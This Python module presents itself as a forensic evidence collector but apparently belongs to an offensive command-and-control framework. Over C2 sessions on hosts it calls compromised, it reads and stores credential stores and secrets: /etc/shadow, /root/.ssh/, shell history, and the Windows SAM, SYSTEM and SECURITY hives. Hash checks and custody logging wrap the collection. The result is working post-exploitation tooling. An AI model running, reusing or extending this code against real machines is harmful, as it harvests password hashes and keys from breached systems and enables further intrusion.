# language: Python, file: core/forensics/collector.py
# Evidence collector — hash-verified artifacts from compromised hosts
import os
import hashlib
import json
import shutil
import threading
from datetime import datetime
from typing import List, Dict, Optional


class Evidence:
    """
    دليل واحد مع chain of custody.
    """
    def __init__(self, name: str, source_path: str, host: str,
                  content: bytes, kind: str = "file"):
        self.name = name
        self.source_path = source_path
        self.host = host
        self.content = content
        self.kind = kind
        self.collected_at = datetime.now().isoformat()
        self.sha256 = hashlib.sha256(content).hexdigest()
        self.md5 = hashlib.md5(content).hexdigest()
        self.size = len(content)
        self.custody_log = [{
            "action": "collected",
            "actor": "system",
            "ts": self.collected_at,
        }]

    def add_custody(self, action: str, actor: str = "operator"):
        self.custody_log.append({
            "action": action,
            "actor": actor,
            "ts": datetime.now().isoformat(),
        })

    def to_dict(self) -> dict:
        return {
            "name": self.name,
            "source": self.source_path,
            "host": self.host,
            "kind": self.kind,
            "size": self.size,
            "sha256": self.sha256,
            "md5": self.md5,
            "collected_at": self.collected_at,
            "custody_log": self.custody_log,
        }


class ForensicsCollector:
    """
    يجمع أدلة من hosts مخترقة عبر C2.
    كل دليل:
      - hash verified
      - chain of custody
      - stored in case folder
    """
    ARTIFACT_PATHS = {
        "linux": [
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "/etc/crontab", "/etc/cron.d/",
            "/var/log/auth.log", "/var/log/syslog",
            "/var/log/secure", "/var/log/messages",
            "/root/.bash_history", "/root/.ssh/",
            "/var/log/wtmp", "/var/log/btmp",
            "/etc/systemd/system/",
            "/tmp/",
        ],
        "windows": [
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SECURITY",
            "C:\\Windows\\System32\\winevt\\Logs\\",
            "C:\\Windows\\Prefetch\\",
            "C:\\Windows\\Temp\\",
            "C:\\Users\\Public\\",
            "C:\\Users\\*/AppData\\Roaming\\",
        ],
    }

    def __init__(self, log_queue=None):
        self.log = log_queue
        self.cases = {}          # case_id → {evidence: [], meta}
        self.case_dir = "forensics"
        os.makedirs(self.case_dir, exist_ok=True)

    def create_case(self, case_id: str, host: str,
                     description: str = "") -> dict:
        """ينشئ case جديد"""
        if case_id in self.cases:
            return {"error": "case already exists"}

        case_path = os.path.join(self.case_dir, case_id)
        os.makedirs(case_path, exist_ok=True)

        self.cases[case_id] = {
            "id": case_id,
            "host": host,
            "description": description,
            "created": datetime.now().isoformat(),
            "evidence": [],
            "path": case_path,
        }
        return {"status": "created", "case_id": case_id}

    def collect_from_session(self, case_id: str, c2_bridge,
                               session_id: str) -> dict:
        """
        يجمع الأدلة من جلسة C2 نشطة.
        """
        if case_id not in self.cases:
            return {"error": "case not found"}

        case = self.cases[case_id]
        host = case["host"]

        # detect OS
        os_info = c2_bridge._exec(session_id, "uname -a")
        is_windows = "windows" in (os_info or "").lower() or \
                     "microsoft" in (os_info or "").lower()
        artifact_paths = (self.ARTIFACT_PATHS["windows"] if is_windows
                            else self.ARTIFACT_PATHS["linux"])

        collected = 0
        for path in artifact_paths:
            try:
                # check if exists
                exists_cmd = f"ls -la {path} 2>/dev/null || dir {path} 2>nul"
                exists = c2_bridge._exec(session_id, exists_cmd)
                if not exists or len(exists.strip()) < 5:
                    continue

                # read content
                if is_windows:
                    read_cmd = f"type {path}"
                else:
                    read_cmd = f"cat {path}"

                content = c2_bridge._exec(session_id, read_cmd)
                if not content or "[error]" in content:
                    continue

                # create evidence
                name = os.path.basename(path.rstrip("/\\")) or "file"
                evidence = Evidence(
                    name=name,
                    source_path=path,
                    host=host,
                    content=content.encode("utf-8", errors="ignore"),
                    kind="file",
                )

                # store
                evidence_dir = os.path.join(case["path"], "evidence")
                os.makedirs(evidence_dir, exist_ok=True)
                safe_name = name.replace("/", "_").replace("\\", "_")
                file_path = os.path.join(
                    evidence_dir,
                    f"{safe_name}_{evidence.sha256[:8]}.bin")
                with open(file_path, "wb") as f:
                    f.write(evidence.content)
                evidence.stored_path = file_path
                evidence.add_custody("stored", "collector")

                case["evidence"].append(evidence)
                collected += 1

                if self.log:
                    self.log.put(
                        f"[forensics] collected {path} from {host} "
                        f"({evidence.size} bytes, sha256={evidence.sha256[:8]})")

            except Exception as e:
                if self.log:
                    self.log.put(f"[forensics] {path}: {e}")

        return {
            "case_id": case_id,
            "host": host,
            "collected": collected,
            "total_artifacts_tried": len(artifact_paths),
        }

    def verify_evidence(self, case_id: str) -> dict:
        """يتحقق من سلامة كل الأدلة (hash check)"""
        if case_id not in self.cases:
            return {"error": "case not found"}
        case = self.cases[case_id]

        results = []
        for ev in case["evidence"]:
            try:
                with open(ev.stored_path, "rb") as f:
                    current = f.read()
                current_hash = hashlib.sha256(current).hexdigest()
                verified = current_hash == ev.sha256
                results.append({
                    "evidence": ev.name,
                    "verified": verified,
                    "expected": ev.sha256,
                    "current": current_hash,
                })
            except Exception as e:
                results.append({
                    "evidence": ev.name,
                    "verified": False,
                    "error": str(e),
                })

        return {
            "case_id": case_id,
            "total": len(results),
            "verified": sum(1 for r in results if r["verified"]),
            "results": results,
        }

    def get_case(self, case_id: str) -> Optional[dict]:
        if case_id not in self.cases:
            return None
        case = self.cases[case_id]
        return {
            "id": case["id"],
            "host": case["host"],
            "description": case["description"],
            "created": case["created"],
            "evidence": [ev.to_dict() for ev in case["evidence"]],
        }

    def list_cases(self) -> list:
        return [
            {
                "id": cid,
                "host": c["host"],
                "created": c["created"],
                "evidence_count": len(c["evidence"]),
            }
            for cid, c in self.cases.items()
        ]

    def export_case(self, case_id: str, output: str) -> str:
        """يصدّر case كامل بـ JSON + manifest"""
        if case_id not in self.cases:
            return ""
        case_data = self.get_case(case_id)

        manifest = {
            "case": case_data,
            "exported": datetime.now().isoformat(),
            "verification": self.verify_evidence(case_id),
        }
        with open(output, "w") as f:
            json.dump(manifest, f, indent=2, default=str)
        return output


collector = ForensicsCollector()
